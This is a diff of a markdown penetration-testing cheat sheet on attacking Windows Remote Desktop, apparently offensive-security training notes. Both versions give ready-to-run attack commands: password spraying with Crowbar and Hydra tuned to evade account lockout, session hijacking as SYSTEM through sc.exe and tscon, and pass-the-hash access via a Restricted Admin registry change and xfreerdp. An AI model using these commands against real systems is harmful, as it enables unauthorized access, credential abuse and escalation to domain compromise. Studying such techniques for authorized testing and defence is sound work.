@@ -1,114 +1,78 @@
-### RDP Enumeration and Initial Access
+## RDP Enumeration and Password Spraying
 
-The **Remote Desktop Protocol (RDP)** typically operates on **TCP port 3389**. It is a primary target for administrative access and lateral movement.
+RDP open on TCP/3389 with a need to identify valid credentials while bypassing **account lockout policies**.
 
-#### Service Identification
-
-Use **Nmap** to confirm the service is reachable before attempting credential-based attacks.
-
-|Parameter|Description|
-|:--|:--|
-|`-Pn`|Disable host discovery|
-|`-p3389`|Target the default RDP port|
+Identify the service and port state
 
 ```
 nmap -Pn -p3389 <TARGET_IP>
 ```
 
-#### Password Spraying
-
-**Scenario:** Use when you have a list of potential usernames but no passwords. This technique attempts a single password against many users to avoid **account lockout policies**.
-
-1. **Crowbar:** Effective for bulk RDP credential testing.
+Perform password spraying using Crowbar to test one password against multiple users
 
 ```
-crowbar -b rdp -s <TARGET_IP>/32 -U <USER_FILE> -c '<PASSWORD>'
+crowbar -b rdp -s <TARGET_IP>/32 -U <FILE_PATH> -c '<PASSWORD>'
 ```
 
-2. **Hydra:** A versatile alternative, though RDP modules may require stability flags.
+Perform password spraying using Hydra with throttled connections to avoid service instability
 
 ```
-hydra -L <USER_FILE> -p '<PASSWORD>' <TARGET_IP> rdp
+hydra -L <FILE_PATH> -p '<PASSWORD>' <TARGET_IP> rdp
 ```
 
-**Operational Note:** RDP servers often struggle with high concurrency. Use `-t 1` or `-t 4` in Hydra to limit parallel connections and `-W 1` to prevent service instability.
+- Crowbar
+    
+    - `crowbar -b rdp -s <TARGET_IP>/32 -U <FILE_PATH> -c '<PASSWORD>'`
+    - Prefer for straightforward RDP-specific spraying.
+- Hydra
+    
+    - `hydra -L <FILE_PATH> -p '<PASSWORD>' <TARGET_IP> rdp`
+    - Prefer when granular control over connection speed and parallel tasks is required to prevent **service crashes**.
+- **Account lockout** will trigger if the password policy is exceeded; spray a single password across the user list before switching to a new one.
+    
+- **RDP connection limits** often cause Hydra to fail; use `-t 1` or `-W 1` to reduce parallel tasks and wait between attempts.
+    
 
----
+## RDP Session Hijacking
 
-### Establishing a GUI Session
+A machine is compromised with **local administrator** access and other active user sessions exist for impersonation.
 
-If plaintext credentials are known, use a desktop client to gain full graphical control.
+List active sessions to find a target UserID and the current session name
 
 ```
-rdesktop -u <USERNAME> -p <PASSWORD> <TARGET_IP>
+query user
 ```
 
----
+Create a system service to execute the hijack command as **SYSTEM**
 
-### RDP Session Hijacking
+```
+sc.exe create <SERVICE_NAME> binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>"
+```
 
-**Scenario:** Use when you have gained **local administrator** access on a machine where a high-privilege user (e.g., Domain Admin) is currently logged in via RDP. This allows you to impersonate the user without knowing their password.
+Trigger the hijacking service to open the target's desktop
 
-**Requirements:**
+```
+net start <SERVICE_NAME>
+```
 
-- **Local Administrator** privileges (to transition to SYSTEM).
-- **SYSTEM** privileges (required by `tscon.exe`).
+- **Server 2019** prevents this specific service-based hijacking method.
+- **SYSTEM privileges** are mandatory to use `tscon.exe` for session impersonation without the target's password.
 
-#### Operational Workflow
+## RDP Pass-the-Hash
 
-1. **Identify Active Sessions:** List users to find the target `SESSION_ID` and your own `SESSION_NAME`.
-    
-    ```
-    query user
-    ```
-    
-2. **Create a Hijack Service:** Since `sc.exe` runs as **Local System** by default, use it to execute the hijack command.
-    
-    ```
-    sc.exe create <SERVICE_NAME> binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>"
-    ```
-    
-3. **Execute Privilege Escalation:** Start the service to trigger the session swap.
-    
-    ```
-    net start <SERVICE_NAME>
-    ```
-    
+GUI access is required but only the NTLM hash is available from the SAM or memory.
 
-**Attack Implications:** Successful hijacking can result in full domain compromise if a Domain Admin session is targeted. **Edge Case:** This specific method is ineffective on **Windows Server 2019**.
-
----
-
-### RDP Pass-the-Hash (PtH)
-
-**Scenario:** Use when you have retrieved an **NTLM hash** (e.g., from the SAM database) but cannot crack it to find the plaintext password, yet still require GUI access.
-
-#### Required Registry Modification
-
-The target must have **Restricted Admin Mode** enabled. If it is disabled, you can manually add the registry key if you have sufficient local permissions.
-
-|Key Path|Value Name|Type|Data|
-|:--|:--|:--|:--|
-|`HKLM\System\CurrentControlSet\Control\Lsa`|`DisableRestrictedAdmin`|`REG_DWORD`|`0x0`|
+Modify the registry to allow Restricted Admin Mode for PtH authentication
 
 ```
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
-#### Authentication
-
-Once the registry is configured, use **xfreerdp** with the `/pth` flag to authenticate using the hash.
+Connect to the target using the NT hash
 
 ```
-xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<NTLM_HASH>
+xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<HASH>
 ```
 
----
-
-### Vulnerabilities and Misconfigurations
-
-| Condition                          | Risk                                                                                |
-| :--------------------------------- | :---------------------------------------------------------------------------------- |
-| **Missing Password**               | Rarely, misconfigurations allow RDP access without any credentials.                 |
-| **DisableRestrictedAdmin = 0**     | Enables attackers to use Pass-the-Hash for RDP GUI access.                          |
-| **Active High-Privilege Sessions** | Allows local admins to hijack sessions via `tscon.exe` to escalate to Domain Admin. |
+- **DisableRestrictedAdmin** must be set to `0x0` or the connection will be blocked by account restrictions.
+- **Plaintext credentials** are not required if the registry modification is successful and `xfreerdp` is used with the `/pth` flag.
